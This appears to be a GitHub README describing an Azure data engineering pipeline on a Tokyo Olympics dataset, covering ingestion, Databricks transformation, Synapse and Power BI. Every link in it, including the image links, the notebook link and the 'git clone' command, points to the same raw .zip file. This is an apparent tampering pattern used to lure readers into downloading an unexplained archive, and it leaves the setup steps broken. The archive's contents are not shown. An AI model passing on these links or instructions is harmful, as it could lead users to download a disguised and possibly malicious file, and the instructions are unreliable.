
# 🏅 Tokyo Olympic Azure Data Engineering Project

This project showcases an **end-to-end Azure Data Engineering pipeline** built using the **Tokyo Olympics dataset**. It demonstrates how raw data can be ingested, transformed, and visualized through various Azure services — simulating real-world enterprise data workflows.

---

## 📌 Project Objective

To design and implement a scalable Azure-based data engineering solution that:
- Ingests raw Olympic datasets
- Transforms and stores them efficiently
- Enables analytics and dashboarding
- Provides insights such as medal tallies, gender-based entries, and country-wise performance

---

## 🧱 Architecture Overview

![Data Architecture](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)

### 🔹 Workflow Components:
- **Data Ingestion**: Azure Data Factory (ADF) loads flat files from on-prem or blob source into Azure Data Lake Gen2.
- **Storage**: Raw and transformed data are organized in separate zones within Data Lake Gen2.
- **Transformation**: Azure Databricks cleanses, flattens, and enriches the data using PySpark notebooks.
- **Analytics**: Transformed data is served to Azure Synapse Analytics for querying and BI modeling.
- **Visualization**: Dashboards are built using Power BI.

---

## 🔄 Data Ingestion Pipeline

![ADF Pipeline](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)

This ADF pipeline extracts and loads datasets like:
- Athletes
- Coaches
- Medals
- Teams
- EntriesGender

Each dataset is individually copied to the staging zone of the data lake using parallel copy data activities.

---

## 🔍 Data Transformation

Performed in **Azure Databricks** using PySpark notebooks:
- Data cleansing and deduplication
- Column standardization and type casting
- Joins between datasets (e.g., Athletes ↔ Medals)
- Storage of transformed tables in parquet format

Notebook: [`Tokyo Olympic https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip`](./Tokyo%20Olympic%https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)

---

## 📊 Sample Output

![Medal Distribution](https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip)

The chart above displays top countries by total medal count, helping identify high-performing nations and regional trends.

---

## 🧰 Tech Stack

| Layer         | Tools Used                                      |
|---------------|--------------------------------------------------|
| Ingestion     | Azure Data Factory                               |
| Storage       | Azure Data Lake Gen2                             |
| Transformation| Azure Databricks, PySpark                        |
| Analytics     | Azure Synapse Analytics                          |
| Visualization | Power BI                                         |
| Languages     | Python, SQL, PySpark                             |

---

## 🚀 How to Run This Project

1. Clone the repository:
   ```bash
   git clone https://raw.githubusercontent.com/logespandu/Tokyo_Olympics_Azure_Data_Engineering_Pipeline/main/data/Tokyo_Olympics_Azure_Data_Engineering_Pipeline-v2.3.zip
   cd tokyo-olympic-azure-data-engineering-project
   ```

2. Upload the dataset files to Azure Blob Storage or ADLS Gen2

3. Use Azure Data Factory to ingest data to your Data Lake

4. Run transformation notebook in Databricks

5. Connect Synapse or Power BI to visualize

---

## 🙌 Acknowledgements

Special thanks to publicly available Tokyo Olympics datasets and Microsoft Azure services for making this project possible.

